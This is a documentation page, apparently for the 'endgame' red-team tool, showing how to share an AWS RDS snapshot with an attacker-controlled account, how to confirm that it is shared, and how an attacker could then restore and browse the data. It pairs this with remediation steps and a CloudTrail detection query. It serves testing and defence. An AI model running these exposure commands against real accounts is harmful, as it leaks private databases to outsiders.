# RDS Snapshots

* [Steps to Reproduce](#steps-to-reproduce)
* [Exploitation](#exploitation)
* [Remediation](#remediation)
* [Basic Detection](#basic-detection)
* [References](#references)

## Steps to Reproduce

* To expose the resource using `endgame`, run the following from the victim account:

```bash
export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil

endgame expose --service rds --name test-resource-exposure
```


* To view a list of the AWS Accounts that have access to the RDS DB Snapshot, run the following command from the victim account:

```bash
aws rds describe-db-snapshot-attributes \
    --db-snapshot-identifier test-resource-exposure
```


## Example

* Observe that the account ID of the evil principal (`999988887777`) is listed alongside the AttributeName called `restore`. This means that the evil account ID is able to restore the snapshot of the RDS database in their own account.

```json
{
    "DBSnapshotAttributesResult": {
        "DBSnapshotIdentifier": "test-resource-exposure",
        "DBSnapshotAttributes": [
            {
                "AttributeName": "restore",
                "AttributeValues": [
                    "999988887777"
                ]
            }
        ]
    }
}
```

## Exploitation

After the RDS snapshot is public or shared with the rogue user account, an attacker can then:
* [copy the snapshot](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_CopySnapshot.html#USER_CopyDBSnapshot)
* [Restore a DB Instance from the DB Snapshot](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_Tutorials.RestoringFromSnapshot.html)
* Browse the contents of the database, potentially revealing sensitive or otherwise non-public information.

## Remediation

> ‼️ **Note**: At the time of this writing, AWS Access Analyzer does **NOT** support auditing of this resource type to prevent resource exposure. **We kindly suggest to the AWS Team that they support all resources that can be attacked using this tool**. 😊

* **Encrypt all Snapshots with Customer-Managed Keys**: Follow the encryption-related recommendations in the [Prevention Guide](https://endgame.readthedocs.io/en/latest/prevention/#use-aws-kms-customer-managed-keys)
* **Trusted Accounts Only**: Ensure that RDS Snapshots are only shared with trusted accounts, and that the trusted accounts truly need access to the RDS Snapshots.
* **Ensure access is necessary**: For any trusted accounts that do have access, ensure that the access is absolutely necessary.
* **Restrict access to IAM permissions that could lead to exposure of your RDS Snapshots**: Tightly control access to the following IAM actions:
      - [rds:DescribeDbClusterSnapshotAttributes](https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBClusterSnapshotAttributes.html): _Grants permission to return a list of DB cluster snapshot attribute names and values for a manual DB cluster snapshot. This includes information on which AWS Accounts have access to the snapshot._
      - [rds:DescribeDbClusterSnapshots](https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBClusterSnapshots.html): _Grants permission to return information about DB cluster snapshots._
      - [rds:DescribeDbSnapshotAttributes](https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBSnapshotAttributes.html): _Grants permission to return a list of DB snapshot attribute names and values for a manual DB snapshot. This includes information on which AWS Accounts have access to the snapshot._
      - [rds:DescribeDbSnapshots](https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_DescribeDBSnapshots.html): _Grants permission to return information about DB snapshots_
      - [rds:ModifyDBSnapshotAttribute](https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_ModifyDBSnapshotAttribute.html): _Grants permission to add an attribute and values to, or removes an attribute and values from, a manual DB snapshot. This includes the ability to share snapshots with other AWS Accounts._
      - [rds:ModifyDBClusterSnapshotAttribute](https://docs.aws.amazon.com/AmazonRDS/latest/APIReference/API_ModifyDBClusterSnapshotAttribute.html): _Grants permission to add an attribute and values to, or removes an attribute and values from, a manual DB cluster snapshot. This includes the ability to share snapshots with other AWS Accounts._

Also, consider using [Cloudsplaining](https://github.com/salesforce/cloudsplaining/#cloudsplaining) to identify violations of least privilege in IAM policies. This can help limit the IAM principals that have access to the actions that could perform Resource Exposure activities. See the example report [here](https://opensource.salesforce.com/cloudsplaining/)

## Basic Detection
The following CloudWatch Log Insights query will include exposure actions taken by endgame:
```
fields eventTime, eventSource, eventName, userIdentity.arn, userAgent 
| filter eventSource='rds.amazonaws.com' AND (eventName='ModifyDBSnapshotAttribute' or eventName='ModifyDBClusterSnapshotAttribute' and requestParameters.attributeName='restore')
```

This query assumes that your CloudTrail logs are being sent to CloudWatch and that you have selected the correct log group.

## References

- [aws rds modify-db-cluster-snapshot-attribute](https://docs.aws.amazon.com/cli/latest/reference/rds/modify-db-cluster-snapshot-attribute.html)
- [aws rds modify-db-snapshot-attribute](https://docs.aws.amazon.com/cli/latest/reference/rds/modify-db-snapshot-attribute.html)
- [aws rds describe-db-snapshot-attributes](https://docs.aws.amazon.com/cli/latest/reference/rds/describe-db-snapshot-attributes.html)
